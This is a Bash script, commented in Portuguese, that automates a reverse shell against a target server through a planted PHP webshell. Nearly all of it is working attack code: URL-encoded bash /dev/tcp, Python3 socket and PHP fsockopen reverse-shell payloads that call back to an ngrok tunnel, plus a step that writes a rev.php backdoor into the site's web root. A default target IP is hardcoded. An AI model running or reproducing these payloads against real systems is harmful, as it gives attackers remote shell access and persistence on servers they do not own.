#!/bin/bash

# Script para estabelecer Reverse Shell automático
# Uso: ./reverse_shell.sh [IP_ALVO] [NGROK_HOST] [NGROK_PORT]
# Se não passar argumentos, usa valores padrão configurados

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Valores padrão (configuração atual)
DEFAULT_TARGET_IP="18.213.151.81"
DEFAULT_NGROK_HOST="0.tcp.sa.ngrok.io"
DEFAULT_NGROK_PORT="18117"

# Usar argumentos se fornecidos, senão usar valores padrão
if [ $# -ge 3 ]; then
    TARGET_IP="$1"
    NGROK_HOST="$2"
    NGROK_PORT="$3"
    echo -e "${BLUE}[*] Usando valores fornecidos como argumentos${NC}"
elif [ $# -eq 0 ]; then
    TARGET_IP="$DEFAULT_TARGET_IP"
    NGROK_HOST="$DEFAULT_NGROK_HOST"
    NGROK_PORT="$DEFAULT_NGROK_PORT"
    echo -e "${BLUE}[*] Usando valores padrão configurados${NC}"
else
    echo -e "${RED}[!] Uso: $0 [IP_ALVO] [NGROK_HOST] [NGROK_PORT]${NC}"
    echo -e "${YELLOW}[*] Se não passar argumentos, usa valores padrão${NC}"
    echo -e "${YELLOW}Exemplo: $0 98.84.117.48 0.tcp.sa.ngrok.io 10730${NC}"
    echo -e "${YELLOW}Ou simplesmente: $0${NC}"
    exit 1
fi
WEBSHELL_URL="http://${TARGET_IP}/shell.php"
REV_PHP="/var/www/blogo/rev.php"

echo -e "${GREEN}[*] Iniciando estabelecimento de Reverse Shell...${NC}"
echo -e "${YELLOW}[*] Alvo: ${TARGET_IP}${NC}"
echo -e "${YELLOW}[*] Ngrok: ${NGROK_HOST}:${NGROK_PORT}${NC}"
echo ""

# Verificar se webshell está acessível
echo -e "${GREEN}[*] Verificando webshell...${NC}"
RESPONSE=$(curl -s "${WEBSHELL_URL}?cmd=whoami" 2>/dev/null)
if [ -z "$RESPONSE" ] || ! echo "$RESPONSE" | grep -q "www-data"; then
    echo -e "${RED}[!] Webshell não está respondendo corretamente!${NC}"
    echo -e "${YELLOW}[*] Tentando continuar mesmo assim...${NC}"
else
    echo -e "${GREEN}[+] Webshell confirmada!${NC}"
fi

# Método 1: Bash Reverse Shell
echo -e "${GREEN}[*] Método 1: Executando Bash Reverse Shell...${NC}"
curl -s "${WEBSHELL_URL}?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/${NGROK_HOST}/${NGROK_PORT}+0%3E%261%27" > /dev/null 2>&1 &
sleep 2

# Método 2: Python3 Reverse Shell
echo -e "${GREEN}[*] Método 2: Executando Python3 Reverse Shell...${NC}"
PYTHON_PAYLOAD="python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22${NGROK_HOST}%5C%22%2C${NGROK_PORT}%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%5C%22/bin/bash%5C%22%2C%5C%22-i%5C%22%5D%29%27"
curl -s "${WEBSHELL_URL}?cmd=${PYTHON_PAYLOAD}" > /dev/null 2>&1 &
sleep 2

# Método 3: Criar e executar script PHP
echo -e "${GREEN}[*] Método 3: Criando script PHP reverso...${NC}"
# Criar o arquivo PHP no servidor usando printf com escape adequado
PHP_CMD="printf+%27%3C%3Fphp%0A%24sock%3Dfsockopen%28%5C%22${NGROK_HOST}%5C%22%2C${NGROK_PORT}%29%3B%0Aif%28%24sock%29%7B%0A+exec%28%5C%22/bin/bash+-i+%3C%263+%3E%263+2%3E%263%5C%22%29%3B%0A%7D%0A%3F%3E%27+%3E+${REV_PHP}"
curl -s "${WEBSHELL_URL}?cmd=${PHP_CMD}" > /dev/null 2>&1
sleep 1

# Executar o script PHP
echo -e "${GREEN}[*] Executando script PHP...${NC}"
curl -s "http://${TARGET_IP}/rev.php" > /dev/null 2>&1 &
sleep 2

echo ""
echo -e "${GREEN}[+] Reverse Shell estabelecida!${NC}"
echo -e "${YELLOW}[*] Verifique seu netcat (nc -lnvp 4444)${NC}"
echo -e "${YELLOW}[*] Se não funcionou, tente acessar: http://${TARGET_IP}/rev.php${NC}"
echo ""
echo -e "${GREEN}[*] Comandos executados:${NC}"
echo -e "  1. Bash: bash -i >& /dev/tcp/${NGROK_HOST}/${NGROK_PORT} 0>&1"
echo -e "  2. Python3: Reverse shell via socket"
echo -e "  3. PHP: Script criado em ${REV_PHP}"
echo ""
